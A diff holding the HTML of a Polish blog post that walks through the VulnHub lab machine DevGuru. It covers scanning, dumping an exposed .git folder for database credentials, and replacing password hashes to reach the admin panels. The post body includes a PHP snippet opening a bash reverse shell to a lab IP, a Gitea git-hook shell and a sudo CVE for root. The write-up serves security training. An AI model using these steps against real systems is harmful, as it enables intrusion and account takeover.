@@ -1,0 +1,760 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>DevGuru | Mateusz Suszczyk</title>
+<meta name="keywords" content="Linux, Medium" />
+<meta name="description" content="DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root. OSCP like ~ Real life based. Difficulty: Intermediate (Depends on experience)">
+<meta name="author" content="Mateusz Suszczyk">
+<link rel="canonical" href="https://suszczyk.github.io/posts/vulnhub/devguru/" />
+<link crossorigin="anonymous" href="../../../assets/css/stylesheet.min.05ec22396353f5838fc267c8a7e9d490b0f9679d599623d1abcb52b3a80b2af6.css" integrity="sha256-BewiOWNT9YOPwmfIp&#43;nUkLD5Z51ZliPRq8tSs6gLKvY=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="../../../assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://suszczyk.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://suszczyk.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://suszczyk.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://suszczyk.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://suszczyk.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.92.2" />
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="DevGuru" />
+<meta property="og:description" content="DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root. OSCP like ~ Real life based. Difficulty: Intermediate (Depends on experience)" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://suszczyk.github.io/posts/vulnhub/devguru/" />
+<meta property="og:image" content="https://suszczyk.github.io/thumbnails/DevGuru.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-11T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2022-08-11T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://suszczyk.github.io/thumbnails/DevGuru.png" />
+<meta name="twitter:title" content="DevGuru"/>
+<meta name="twitter:description" content="DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root. OSCP like ~ Real life based. Difficulty: Intermediate (Depends on experience)"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://suszczyk.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "DevGuru",
+      "item": "https://suszczyk.github.io/posts/vulnhub/devguru/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DevGuru",
+  "name": "DevGuru",
+  "description": "DevGuru is a fictional web development company hiring you for a pentest assessment. You have been tasked with finding vulnerabilities on their corporate website and obtaining root. OSCP like ~ Real life based. Difficulty: Intermediate (Depends on experience)",
+  "keywords": [
+    "Linux", "Medium"
+  ],
+  "articleBody": "Zaczynam od skanu sieci, aby odnaleźć naszą maszynę.\nnetdiscover ┌[parrot@parrot]─[~/vulnhub/devguru] └╼[★ ]$sudo netdiscover -r 192.168.2.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 4 Captured ARP Req/Rep packets, from 4 hosts. Total size: 240 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.2.1 00:50:56:c0:00:08 1 60 VMware, Inc. 192.168.2.2 00:50:56:f0:ed:fa 1 60 VMware, Inc. 192.168.2.145 00:0c:29:ee:30:67 1 60 VMware, Inc. 192.168.2.254 00:50:56:e2:f7:dc 1 60 VMware, Inc. IP maszyny: 192.168.2.145.\n NMap ┌[parrot@parrot]─[~/vulnhub/devguru] └╼[★ ]$nmap -sC -sV 192.168.2.145 -p- Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-06 23:04 CEST Nmap scan report for 192.168.2.145 Host is up (0.00073s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA) | 256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA) |_ 256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: DevGuru |_http-title: Corp - DevGuru | http-git: | 192.168.2.145:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file 'description' to name the... | Last commit message: first commit | Remotes: | http://devguru.local:8585/frank/devguru-website.git |_ Project type: PHP application (guessed from .gitignore) |_http-server-header: Apache/2.4.29 (Ubuntu) 8585/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/html; charset=UTF-8 | Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 | Set-Cookie: i_like_gitea=32f5ac169d8deb82; Path=/; HttpOnly | Set-Cookie: _csrf=wBgH_u02QnP4yJ8KIFYSVFpFKnE6MTY1OTgyMDA0MTQ4OTkxMzkwMw; Path=/; Expires=Sun, 07 Aug 2022 21:07:21 GMT; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Sat, 06 Aug 2022 21:07:21 GMT | | =\"en-US\" class=\"theme-\" | =\"\" | =\"utf-8\" | =\"viewport\" content=\"width=device-width, initial-scale=1\" | =\"x-ua-compatible\" content=\"ie=edge\" |  Gitea: Git with a cup of tea  | =\"manifest\" href=\"/manifest.json\" crossorigin=\"use-credentials\" | =\"theme-color\" content=\"#6cc644\" | =\"author\" content=\"Gitea - Git with a cup of tea\" / | =\"description\" content=\"Gitea (Git with a cup of tea) is a painless | HTTPOptions: | HTTP/1.0 404 Not Found | Content-Type: text/html; charset=UTF-8 | Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647 | Set-Cookie: i_like_gitea=16044c52ab089b30; Path=/; HttpOnly | Set-Cookie: _csrf=yMdfk0ejwyAi7ZAapQa4bI5m9tw6MTY1OTgyMDA0MTUwNjQ1Nzk1OA; Path=/; Expires=Sun, 07 Aug 2022 21:07:21 GMT; HttpOnly | X-Frame-Options: SAMEORIGIN | Date: Sat, 06 Aug 2022 21:07:21 GMT | | en-US\" class=\"theme-\" | | utf-8\" | viewport\" content=\"width=device-width, initial-scale=1\" | x-ua-compatible\" content=\"ie=edge\" | Page Not Found - Gitea: Git with a cup of tea  | manifest\" href=\"/manifest.json\" crossorigin=\"use-credentials\" | theme-color\" content=\"#6cc644\" | =\"author\" content=\"Gitea - Git with a cup of tea\" / |_ =\"description\" content=\"Gitea (Git with a c 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi ?new-service : SF-Port8585-TCP:V=7.92%I=7%D=8/6%Time=62EED80A%P=x86_64-pc-linux-gnu%r(Gen SF:ericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20te SF:xt/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x2 SF:0Request\")%r(GetRequest,2A00,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x SF:20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20Path=/;\\ SF:x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=32f5ac169d8deb82;\\ SF:x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=wBgH_u02QnP4yJ8KIFYSVFpF SF:KnE6MTY1OTgyMDA0MTQ4OTkxMzkwMw;\\x20Path=/;\\x20Expires=Sun,\\x2007\\x20Aug SF:\\x202022\\x2021:07:21\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20SAMEORI SF:GIN\\r\\nDate:\\x20Sat,\\x2006\\x20Aug\\x202022\\x2021:07:21\\x20GMT\\r\\n\\r\\n\\x20html\\n\\x20lang=\\\"en-US\\\"\\x20class=\\\"theme-\\\"\\n\\x2 SF:0data-suburl=\\\"\\\"\\n\\t\\x20charset=\\\"utf-8\\\"\\n\\t\\x20name=\\\"vi SF:ewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\\"\\n\\t\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"\\n\\t\\ SF:x20Gitea:\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\x20\\n\\t\\ SF:x20rel=\\\"manifest\\\"\\x20href=\\\"/manifest\\.json\\\"\\x20crossorigin=\\\"use-cr SF:edentials\\\"\\n\\t\\x20name=\\\"theme-color\\\"\\x20content=\\\"#6cc644\\\"\\n SF:\\t\\x20name=\\\"author\\\"\\x20content=\\\"Gitea\\x20-\\x20Git\\x20with\\x20a\\ SF:x20cup\\x20of\\x20tea\\\"\\x20/\\n\\t\\x20name=\\\"description\\\"\\x20content SF:=\\\"Gitea\\x20\\(Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\)\\x20is\\x20a\\x20pain SF:less\")%r(HTTPOptions,212A,\"HTTP/1\\.0\\x20404\\x20Not\\x20Found\\r\\nContent- SF:Type:\\x20text/html;\\x20charset=UTF-8\\r\\nSet-Cookie:\\x20lang=en-US;\\x20P SF:ath=/;\\x20Max-Age=2147483647\\r\\nSet-Cookie:\\x20i_like_gitea=16044c52ab0 SF:89b30;\\x20Path=/;\\x20HttpOnly\\r\\nSet-Cookie:\\x20_csrf=yMdfk0ejwyAi7ZAap SF:Qa4bI5m9tw6MTY1OTgyMDA0MTUwNjQ1Nzk1OA;\\x20Path=/;\\x20Expires=Sun,\\x2007 SF:\\x20Aug\\x202022\\x2021:07:21\\x20GMT;\\x20HttpOnly\\r\\nX-Frame-Options:\\x20 SF:SAMEORIGIN\\r\\nDate:\\x20Sat,\\x2006\\x20Aug\\x202022\\x2021:07:21\\x20GMT\\r\\n SF:\\r\\n\\x20html\\n\\x20lang=\\\"en-US\\\"\\x20class=\\\"theme-\\\"\\n\\x20data-suburl=\\\"\\\"\\n\\t\\x20charset=\\\"utf-8\\\"\\n\\t\\x20na SF:me=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\\"\\ SF:n\\t\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"\\n\\tPage\\x20Not\\x20Found\\x20-\\x20\\x20Gitea:\\x20Git\\x20with\\x20a\\x20cu SF:p\\x20of\\x20tea\\x20\\n\\t\\x20rel=\\\"manifest\\\"\\x20href=\\\"/mani SF:fest\\.json\\\"\\x20crossorigin=\\\"use-credentials\\\"\\n\\t\\x20name=\\\"the SF:me-color\\\"\\x20content=\\\"#6cc644\\\"\\n\\t SF:nt=\\\"Gitea\\x20-\\x20Git\\x20with\\x20a\\x20cup\\x20of\\x20tea\\\"\\x20/\\n\\t\\x20name=\\\"description\\\"\\x20content=\\\"Gitea\\x20\\(Git\\x20with\\x20a\\x20c SF:\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Strona główna Pierwsze co widać to domena devguru.local, zatem dodaję ją do /etc/hosts.\nZ Wappalyzera widzimy, że jest tutaj October CMS, Lavarel oraz PHP.\n FeroxBuster ┌[parrot@parrot]─[~/vulnhub/devguru] └╼[★ ]$feroxbuster -w /opt/SecLists/Discovery/Web-Content/quickhits.txt -u http://192.168.2.145 -d 1 -r ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \"epi\" Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://192.168.2.145 🚀 Threads │ 50 📖 Wordlist │ /opt/SecLists/Discovery/Web-Content/quickhits.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 📍 Follow Redirects │ true 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 1l 2w 23c http://192.168.2.145/.git/HEAD 200 11l 29w 276c http://192.168.2.145/.git/config 200 977l 3275w 315757c http://192.168.2.145/.git/index 200 1l 10w 158c http://192.168.2.145/.git/logs/HEAD 200 32l 38w 413c http://192.168.2.145/.gitignore 200 52l 146w 1678c http://192.168.2.145/.htaccess 200 50l 231w 4296c http://192.168.2.145/adminer.php 200 34l 216w 1518c http://192.168.2.145/README.md 200 267l 788w 0c http://192.168.2.145/services [####################] - 15s 2482/2482 0s found:9 errors:0  [####################] - 14s 2482/2482 170/s http://192.168.2.145 Mamy kilka trafów. Czyli .git, adminer.php, ale sprawdzę całość większym słownikiem.\n /adminer.php Jest Adminer 4.7.7, na którego nie ma exploitów na searchsploit.\n Pod /backend/backend/auth/signin/ mamy panel logowania.\nFeroxBuster złapał folder .git a w nim plik config. Mamy potencjalnego usera frank oraz link do repo http://devguru.local:8585/frank/devguru-website.git.\n Port 8585 Mamy tutaj Gitea.\nJest exploit, ale potrzebujemy danych do logowania. Jest szansa, że przyda nam się to później.\n Enumeracja .git Sprawdzenie folderu .git zawsze warto przeprowadzić GitTools. Mamy tu gitdumper oraz extractor. Na początku użyłem dumpera, którym pobrałem folder .git znaleziony przez FeroxBustera.\nsudo /opt/GitTools/Dumper/gitdumper.sh http://192.168.2.145/.git/ . sudo /opt/GitTools/Extractor/extractor.sh . /.git_extracted Mamy między innymi adminer.php wykryty przez FeroxBustera.\nWyszukanie po frazy frank nic ciekawego nie znalazło.\nInaczej w przypadku frazy password 😁\nPlik database.php zawiera to hasło, dlatego przejrzałem całość.\n'mysql' = [ 'driver' = 'mysql', 'engine' = 'InnoDB', 'host' = 'localhost', 'port' = 3306, 'database' = 'octoberdb', 'username' = 'october', 'password' = 'SQ66EBYx4GT3byXH', 'charset' = 'utf8mb4', 'collation' = 'utf8mb4_unicode_ci', 'prefix' = '', 'varcharmax' = 191, ], 'pgsql' = [ 'driver' = 'pgsql', 'host' = 'localhost', 'port' = 5432, 'database' = 'database', 'username' = 'root', 'password' = '', 'charset' = 'utf8', 'prefix' = '', 'schema' = 'public', ], 'sqlsrv' = [ 'driver' = 'sqlsrv', 'host' = 'localhost', 'port' = 1433, 'database' = 'database', 'username' = 'root', 'password' = '', 'prefix' = '', ], Mamy usera i hasło - october:SQ66EBYx4GT3byXH. Najpierw sprawdziłem do panelu October CMS, ale nie działało, zadziałało na panel Adminera. W końcu config jest właśnie od Adminera.\nUdało się wejść na panel. Szybko zlokalizowałem tabelę backend_users. Mamy tam informacje o userze frank wraz z hashem. Podjąłem nieskuteczne próby łamania.\nPo długim googlowaniu, sprawdziłem ten hash na stronie poniżej.\nhttps://www.tunnelsup.com/hash-analyzer/\nOkazało się, że jest to bcrypt. Mając tę wiedzę, możemy spreparować hash i podmienić go na inny, ten przez nas znany. Ja podmieniłem hasło na password, a wygenerowałem je na stronie https://bcrypt.online/.\n October CMS Dashboard Udało się zalogować, jesteśmy w dashboardzie.\nW tym momencie możemy w prosty sposób dostać się na maszynę. Należało wejść w CMS = Pages = Add. Teraz należy stworzyć nową stronę a w kodzie umieścić mały fragment. Który po wejściu automatycznie połączy się z naszym listenerem.\nfunction onstart(){ exec(\"/bin/bash -c 'bash -i  /dev/tcp/192.168.2.128/9001 0\u00261'\"); } Zapisałem stronę, a po wejściu na poniższy url, otrzymałem shella 😀\n shell jako www-data Kolejny krok był już trudniejszy. Użyłem LinPEAS, aby złapać potencjalne wektory ataku. Znalazłem interesujące informacje. W folderze /var/backups mamy backup aplikacji. Pliczek nie jest duży. Ma nieco ponad pół MB, ale po szybkim przejrzeniu to może być dobry trop.\nSzukałem frazy frank w pliku i odkryłem, że ten plik to prawdopodobnie plik konfiguracyjny Gitea.\ncat /var/backups/app.ini.bak | grep frank -A10 -B10 Mamy nawet tzw. secret_tokeny, ale po chwili scrollowania znalazłem hasło i usera. Jak widać na screenie jest to username i hasło do mysql, ja rozumiałem to dopiero po dłuższej chwili próbując wejść od razu na Gitea.\nA tutaj kluczem jest dostanie się ponownie na Adminera, tym razem na bazę danych gitea.\nPonownie szybko znalazłem tabelę user, w której mamy ponownie franka, ale teraz mamy całkowicie inny hash. Jest to pbkdf2.\nPodjąłem próby łamania hasha, oczywiście bezskuteczne. Znalazłem stronę, która generuje takie hashe - https://neurotechnics.com/tools/pbkdf2-test\nDodatkową trudnością było ustawienie ilości bajtów tego hasha. Gdy dopasowałem oryginalny hash do tego tworzonego, ustaliłem, że liczba bajtów to 50, salt mamy podaną powyżej. Została umieszczona w generatorze. No i wygenerowałem proste hasło password.\nxxxxxxxx = c200e0d03d1604cee72c484f154dd82d75c7247b04ea971a96dd1def8682d02488d0323397e26a18fb806c7a20f0b564c900\nDodatkowo sporo googlowałem ile powinno być Iterations. W końcu znalazłem w kodzie źródłowym Gitea, że dla pbkdf2 jest to 10000.\npassword = 8c1081ea93e4803d6aa627fca52970b8bb06c35e7fa2c47e1eae3e4f5e6c9515dfaf13d62292547583aef0ee683f92e71c40\n gitea Udało się zalogować na Gitea na poniższe dane frank:password. Teraz kolejny krok, czyli dostanie się na maszynę, tym razem już jako frank. Doczytałem, że jeżeli nasz user ma uprawnienia admina, możemy dodać w ustawieniach danego repo kod, który wykona się przy jakiejkolwiek modyfikacji repo. Wchodzimy w repo - Settings - Git Hooks. Tutaj na dole wrzuciłem prosty skrypt bashowy. Teraz wystarczyło, że zmodyfikowałem lub dodałem jakikolwiek plik w repo. Kod wykonał się, a ja otrzymałem odpowiedź na listenerze.\n shell jako frank Odpaliłem ponownie LinPEAS. Nasz user może wykonywać program sqlite3 z uprawnieniami roota. Jedyny szczegół jest taki, że potrzeba do tego hasła usera frank. Nie wiedziałem jak to przeskoczyć. Po długim googlowaniu podejrzałem wskazówkę, że należy zainteresować się wersją sudo.\nTa wersja sudo ma bardzo poważną podatność CVE-2019-14287, która pozwala na obejście zapytania o hasło. Szerzej opisane jest to tutaj https://www.exploit-db.com/exploits/47502\nMamy roota.\n Root proof ",
+  "wordCount" : "1445",
+  "inLanguage": "en",
+  "image":"https://suszczyk.github.io/thumbnails/DevGuru.png","datePublished": "2022-08-11T00:00:00Z",
+  "dateModified": "2022-08-11T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mateusz Suszczyk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://suszczyk.github.io/posts/vulnhub/devguru/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Mateusz Suszczyk",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://suszczyk.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://suszczyk.github.io" accesskey="h" title="Mateusz Suszczyk (Alt + H)">Mateusz Suszczyk</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://suszczyk.github.io/archives/" title="Archiwum">
+                    <span>Archiwum</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/categories/" title="Kategorie">
+                    <span>Kategorie</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/tags/" title="Tagi">
+                    <span>Tagi</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://suszczyk.github.io/search/" title="Szukaj">
+                    <span>Szukaj</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://suszczyk.github.io">Home</a>&nbsp;»&nbsp;<a href="https://suszczyk.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      DevGuru
+    </h1>
+    <div class="post-meta"><span title='2022-08-11 00:00:00 +0000 UTC'>August 11, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Mateusz Suszczyk
+
+</div>
+  </header> 
+<figure class="entry-cover"><img loading="lazy" src="https://suszczyk.github.io/thumbnails/DevGuru.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#netdiscover" aria-label="netdiscover">netdiscover</a></li>
+                <li>
+                    <a href="#nmap" aria-label="NMap">NMap</a></li>
+                <li>
+                    <a href="#strona-g%c5%82%c3%b3wna" aria-label="Strona główna">Strona główna</a></li>
+                <li>
+                    <a href="#feroxbuster" aria-label="FeroxBuster">FeroxBuster</a></li>
+                <li>
+                    <a href="#adminerphp" aria-label="/adminer.php"><code>/adminer.php</code></a></li>
+                <li>
+                    <a href="#port-8585" aria-label="Port 8585">Port 8585</a></li>
+                <li>
+                    <a href="#enumeracja-git" aria-label="Enumeracja .git">Enumeracja .git</a></li>
+                <li>
+                    <a href="#october-cms-dashboard" aria-label="October CMS Dashboard">October CMS Dashboard</a></li>
+                <li>
+                    <a href="#shell-jako-www-data" aria-label="shell jako www-data">shell jako www-data</a></li>
+                <li>
+                    <a href="#gitea" aria-label="gitea">gitea</a></li>
+                <li>
+                    <a href="#shell-jako-frank" aria-label="shell jako frank">shell jako frank</a></li>
+                <li>
+                    <a href="#root-proof" aria-label="Root proof">Root proof</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p>Zaczynam od skanu sieci, aby odnaleźć naszą maszynę.</p>
+<h2 id="netdiscover">netdiscover<a hidden class="anchor" aria-hidden="true" href="#netdiscover">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/devguru<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$sudo netdiscover -r 192.168.2.0/24
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
+                                                                                                                                                             
+ <span style="color:#ae81ff">4</span> Captured ARP Req/Rep packets, from <span style="color:#ae81ff">4</span> hosts.   Total size: <span style="color:#ae81ff">240</span>                                                                                             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.2.1     00:50:56:c0:00:08      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                                                                                              
+ 192.168.2.2     00:50:56:f0:ed:fa      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                                                                                              
+ 192.168.2.145   00:0c:29:ee:30:67      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.                                                                                              
+ 192.168.2.254   00:50:56:e2:f7:dc      <span style="color:#ae81ff">1</span>      <span style="color:#ae81ff">60</span>  VMware, Inc.
+</code></pre></div><p>IP maszyny: <code>192.168.2.145</code>.</p>
+<hr>
+<h2 id="nmap">NMap<a hidden class="anchor" aria-hidden="true" href="#nmap">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/devguru<span style="color:#f92672">]</span>                                           
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$nmap -sC -sV 192.168.2.145 -p-                                          
+Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-08-06 23:04 CEST               
+Nmap scan report <span style="color:#66d9ef">for</span> 192.168.2.145                                             
+Host is up <span style="color:#f92672">(</span>0.00073s latency<span style="color:#f92672">)</span>.                                                 
+Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>                               
+PORT     STATE SERVICE VERSION                                                 
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>     
+| ssh-hostkey:                                                                 
+|   <span style="color:#ae81ff">2048</span> 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>                 
+|   <span style="color:#ae81ff">256</span> 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>                
+|_  <span style="color:#ae81ff">256</span> 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>              
+80/tcp   open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>                          
+|_http-generator: DevGuru                                                      
+|_http-title: Corp - DevGuru                                                   
+| http-git:                                                                    
+|   192.168.2.145:80/.git/                                                     
+|     Git repository found!                                                    
+|     Repository description: Unnamed repository; edit this file <span style="color:#e6db74">&#39;description&#39;</span> to name the...
+|     Last commit message: first commit                                        
+|     Remotes:                                                                 
+|       http://devguru.local:8585/frank/devguru-website.git                    
+|_    Project type: PHP application <span style="color:#f92672">(</span>guessed from .gitignore<span style="color:#f92672">)</span>                  
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>                                   
+8585/tcp open  unknown                                                         
+| fingerprint-strings:                                                         
+|   GenericLines:                                                              
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request                                                 
+|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
+|     Connection: close
+|     Request                          
+|   GetRequest:                        
+|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
+|     Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+|     Connection: close
+|     Request                          
